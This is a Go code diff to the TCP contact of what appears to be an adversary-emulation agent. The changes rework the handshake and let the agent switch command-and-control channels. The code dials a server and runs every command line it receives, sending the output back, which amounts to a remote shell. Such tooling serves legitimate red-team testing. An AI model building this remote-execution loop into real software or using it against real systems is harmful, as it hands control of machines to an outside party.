@@ -22,21 +22,25 @@ func init() {
 //Listen through a new socket connection
 func (contact TCP) Listen(port string, server string, inbound int, profile map[string]interface{}) string {
 	conn, err := net.Dial("tcp", port)
-	message := ""
+	c2 := "tcp"
 	if err != nil {
 	  output.VerbosePrint(fmt.Sprintf("[-] %s", err))
 	} else {
-	   message = handshake(conn, profile)
+	   handshake(conn, profile)
 	   output.VerbosePrint(fmt.Sprintf("[+] TCP established for %s", profile["paw"]))
-	   listen(conn, profile, server)
+	   c2 = listen(conn, profile, server)
+	   return c2
 	}
-	return message
+	return c2
  }
 
-func listen(conn net.Conn, profile map[string]interface{}, server string) {
+func listen(conn net.Conn, profile map[string]interface{}, server string) string {
     scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
         message := scanner.Text()
+        if strings.Contains(message, "\t") {
+        	return strings.TrimSpace(message)
+		}
 		bites, status := commands.RunCommand(strings.TrimSpace(message), server, profile)
 		pwd, _ := os.Getwd()
 		response := make(map[string]interface{})
@@ -46,22 +50,19 @@ func listen(conn net.Conn, profile map[string]interface{}, server string) {
 		jdata, _ := json.Marshal(response)
 		conn.Write(jdata)
     }
+	return "tcp"
 }
 
-func handshake(conn net.Conn, profile map[string]interface{}) string {
+func handshake(conn net.Conn, profile map[string]interface{}) {
 	//write the profile
 	jdata, _ := json.Marshal(profile)
     conn.Write(jdata)
 	conn.Write([]byte("\n"))
 
-	//read back the paw and contact
+	//read back the paw
     data := make([]byte, 512)
     n, _ := conn.Read(data)
-    //extract tokens
-    s := strings.Split(string(data[:n]),"\t")
-    contact := strings.TrimSpace(s[0])
-    paw := strings.TrimSpace(s[1])
+    paw := string(data[:n])
     conn.Write([]byte("\n"))
-	profile["paw"] = paw
-	return contact
+	profile["paw"] = strings.TrimSpace(string(paw))
 }
